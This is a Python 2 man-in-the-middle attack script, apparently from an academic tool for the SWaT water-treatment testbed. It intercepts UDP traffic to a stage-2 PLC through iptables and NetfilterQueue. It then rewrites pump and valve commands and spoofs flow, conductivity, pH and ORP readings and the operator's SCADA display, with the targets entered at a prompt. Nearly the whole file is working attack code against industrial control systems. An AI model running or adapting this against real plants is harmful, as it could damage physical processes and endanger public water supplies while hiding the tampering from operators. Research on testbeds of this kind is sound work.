#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# Copyright (c) 2019  Beebi Siti Salimah Binte Liyakkathali, liyakkathali@sutd.edu.sg
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER

# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.

#Last modified on: 02 May 2019

# Script part of A6_L0 Mitm tool: https://github.com/ibmilo/A6-L0-MITM
# Some attributes to 	https://github.com/ifyouaretea/A6-MITM
#			https://github.com/scy-phy/swat


import datetime
import ctypes
from time import sleep
from time import time as ts
import signal
import os
import sys
from netfilterqueue import NetfilterQueue
from scapy import all as scapy_all
from scapy.layers.inet import IP
from scapy.layers.inet import UDP


from _PLC2 import SWAT_P2_RIO_DO, SWAT_P2_RIO_DI, SWAT_P2_RIO_AI

from scaling_all import P1Flow, P1Level, P2Flow, P2Cond, P2Ph, P2Orp, P3Level, P3Flow, P3DPress, \
                    P4Level, P4Hrdss, P4Flow, P4Orp, \
                    P5FeedPh, P5FeedOrp, P5FeedCond, P5PremCond, P5FeedFlow, P5PermFlow,\
                    P5ConcFlow, P5RecFlow, P5HPumpPress, P5PermPress, P5ConcPress,\
                    P6BackFlow, current_to_signal, signal_to_current



global toggle_flag
global current_spoofed


device_type = []
device_tag = []
value = []
scada = []




class attack_P2_level0:

    toggle_flag = False
   


    def __init__(self):
        self.toggle_flag = False


    def start(self):
        self.nfqueue = NetfilterQueue()
        os.system('sudo iptables -t mangle -A PREROUTING -s 192.168.0.22,192.168.0.20 -p udp --dport 2222 -j NFQUEUE --queue-num 3') #queue 2 
        self.nfqueue.bind(3, self._launch_P2_attack,10) #queue 2
        self.nfqueue.run()
        print('***********************inject start******************************')


    def stop(self):
        os.system('cat /proc/net/netfilter/nfnetlink_queue')
        os.system('sudo iptables -t mangle -F')
        self.nfqueue.unbind()
        print('*** STOPPING IPTABLES ***')




    def _launch_P2_attack (self,packet):
        

        global device_tag
        global value 
        global scada

        length = len(device_tag)
        ind = 0
        pkt = IP(packet.get_payload())
        
       

        while ind < length:

            dev = device_tag[ind]
            val = value[ind]
            sca = scada[ind]


            if SWAT_P2_RIO_DO in pkt:
                
            
               # print "valve", val
                if dev  == "P201":
                    pkt[SWAT_P2_RIO_DO].P201_Start = val
                elif dev  == "P202":
                    pkt[SWAT_P2_RIO_DO].P202_Start = val
                elif dev  == "P203":
                    pkt[SWAT_P2_RIO_DO].P203_Start = val
                elif dev  == "P204":
                    pkt[SWAT_P2_RIO_DO].P204_Start = val
                elif dev  == "P205":
                    pkt[SWAT_P2_RIO_DO].P205_Start = val
                elif dev  == "P206":
                    pkt[SWAT_P2_RIO_DO].P206_Start = val
                elif dev  == "P207":
                    pkt[SWAT_P2_RIO_DO].P207_Start = val
                elif dev  == "P208":
                    pkt[SWAT_P2_RIO_DO].P208_Start = val

                elif dev  == "red":
                    pkt[SWAT_P2_RIO_DO].LED_RED = val

                elif dev  == "MV201":

                    if val == 0:
                   
                        pkt[SWAT_P2_RIO_DO].MV201_Close = 1
                        pkt[SWAT_P2_RIO_DO].MV201_Open = 0

                    if val == 1:
                   
                        pkt[SWAT_P2_RIO_DO].MV201_Close = 0
                        pkt[SWAT_P2_RIO_DO].MV201_Open = 1
                else :
                    print "Device tag error"


            if SWAT_P2_RIO_DI in pkt:
                if dev  == "P201":
                      pkt[SWAT_P2_RIO_DI].P201_Run = sca
                elif dev  == "P202":
                      pkt[SWAT_P2_RIO_DI].P202_Run = sca
                elif dev  == "P203":
                      pkt[SWAT_P2_RIO_DI].P203_Run = sca
                elif dev  == "P204":
                      pkt[SWAT_P2_RIO_DI].P204_Run = sca
                elif dev  == "P205":
                      pkt[SWAT_P2_RIO_DI].P205_Run = sca
                elif dev  == "P206":
                      pkt[SWAT_P2_RIO_DI].P206_Run = sca
                elif dev  == "P207":
                      pkt[SWAT_P2_RIO_DI].P207_Run = sca
                elif dev  == "P208":
                      pkt[SWAT_P2_RIO_DI].P208_Run = sca

                elif dev == "LS201":
                      pkt[SWAT_P2_RIO_DI].LS201_Low = sca
                elif dev == "LS202":
                      pkt[SWAT_P2_RIO_DI].LS202_Low = sca
                elif dev == "LS203":
                      pkt[SWAT_P2_RIO_DI].LS203_Low = sca

                elif dev == "MV101":

                  if sca == 0:

                      pkt[SWAT_P2_RIO_DI].MV201_Close = 1
                      pkt[SWAT_P2_RIO_DI].MV201_Open = 0

                  elif sca == 1:

                      pkt[SWAT_P2_RIO_DI].MV201_Close = 0
                      pkt[SWAT_P2_RIO_DI].MV201_Open = 1

                else :
                  print "Device tag error"




            if SWAT_P2_RIO_AI in pkt:

                if dev == "FIT201":

                  self.true_measurement_P2_flow =  current_to_signal(pkt[SWAT_P2_RIO_AI].FIT201_Flow, P2Flow)  #scaling

                  if(self.toggle_flag == False):
                    spoofed_measurement = self.true_measurement_P2_flow
                    self.toggle_flag = True
                
                  if(self.toggle_flag):
                    spoofed_measurement = val
                    current_spoofed = signal_to_current(spoofed_measurement, P2Flow) 
                    pkt[SWAT_P2_RIO_AI].FIT201_Flow =  current_spoofed

                    print('FIT201 valve changed from  %1.4f to %1.4f ' % (self.true_measurement_P2_flow,spoofed_measurement))


                #alter conductivity
                if dev == "AIT201":


                  self.true_measurement_P2_Cond =  current_to_signal(pkt[SWAT_P2_RIO_AI].AIT201_Conductivity, P2Cond)  #scaling

                  if(self.toggle_flag == False):
                    spoofed_measurement = self.true_measurement_P2_Cond
                    self.toggle_flag = True
                
                  if(self.toggle_flag):
                    spoofed_measurement = val
                    current_spoofed = signal_to_current(spoofed_measurement, P2Cond) 
                    pkt[SWAT_P2_RIO_AI].AIT201_Conductivity =  current_spoofed

                    print('AIT201 valve changed from  %1.4f to %1.4f ' % (self.true_measurement_P2_Cond,spoofed_measurement))


                #alter pH
                if dev == "AIT202":


                  self.true_measurement_P2_pH =  current_to_signal(pkt[SWAT_P2_RIO_AI].AIT202_pH, P2Ph)  #scaling

                  if(self.toggle_flag == False):
                    spoofed_measurement = self.true_measurement_P2_pH
                    self.toggle_flag = True
                
                  if(self.toggle_flag):
                    spoofed_measurement = val
                    current_spoofed = signal_to_current(spoofed_measurement, P2Ph) 
                    pkt[SWAT_P2_RIO_AI].AIT202_pH =  current_spoofed

                    print('AIT202 valve changed from  %1.4f to %1.4f ' % (self.true_measurement_P2_pH,spoofed_measurement))


                #alter ORP
                if dev == "AIT203":


                  self.true_measurement_P2_ORP =  current_to_signal(pkt[SWAT_P2_RIO_AI].AIT203_ORP, P2Orp)  #scaling

                  if(self.toggle_flag == False):
                    spoofed_measurement = self.true_measurement_P2_ORP
                    self.toggle_flag = True
                
                  if(self.toggle_flag):
                    spoofed_measurement = val
                    current_spoofed = signal_to_current(spoofed_measurement, P2Orp) 
                    pkt[SWAT_P2_RIO_AI].AIT203_ORP =  current_spoofed

                    print('AIT203 valve changed from  %1.4f to %1.4f ' % (self.true_measurement_P2_ORP,spoofed_measurement))


            
            ind = ind +1

            del pkt[UDP].chksum  # Need to recompute checksum
            pkt.show()
            packet.set_payload(str(pkt))

        packet.accept()


  



def start():

     attacker = attack_P2_level0();
     def signal_term_handler(signal, frame):
         print('*** STOPPING')
         attacker.stop()

     signal.signal(signal.SIGTERM, signal_term_handler)
     try:
         print('attacker is loaded')
         attacker.start()
         signal.pause()  # wait for a signal
     except KeyboardInterrupt:
         print('*** STOPPING')
         attacker.stop()



            

if __name__=='__main__':
    num_of_attacks = int(raw_input('Enter number of actuators attacks : '))


    for i in range (num_of_attacks) :
        print ("For Point %i >>>") % (i + 1)

        dev_type = raw_input('Enter device type to attack (e.g PUMP, AIT, VALVE, SWITCH) : ')
        dev_tag = raw_input('Enter tag  to attack (e.g P201, MV201, FIT201,LS201) : ')
          
        if dev_type == "PUMP" or dev_type == "VALVE" or dev_type == "LED":
           val =  int (raw_input('Enter value - ON (1) or OFF (0) : '))
           sca =  int (raw_input('Set SCADA display to - ON (1) or OFF (0) : '))


        elif dev_type == "FIT" or dev_type == "LIT" or dev_type == "AIT":
            val =  int (raw_input('Enter value to spoofed value : '))
            sca = 0

        elif dev_type == "SWITCH":
          sca =  int (raw_input('Set SWITCH display to - Not Low (1) or Low (0) : '))
          val =0
        else:
            print "Device type not found"
            sys.exit()

        if dev_tag =="P201" or dev_tag == "P202" or dev_tag == "P203" or dev_tag == "P204" \
        or dev_tag == "P205" or dev_tag == "P206" or dev_tag == "P207" or dev_tag == "P208" \
        or dev_tag == "AIT201" or dev_tag == "AIT202" or dev_tag == "AIT203" or dev_tag == "MV201" or dev_tag == "FIT201"\
        or dev_tag == "LS201" or "LS202" or "LS203": 

          device_type.append(dev_type)
          device_tag.append(dev_tag)
          value.append(val)
          scada.append(sca)
          
        else:
          print "Device tag not found"
          sys.exit()

    sys.exit(start())







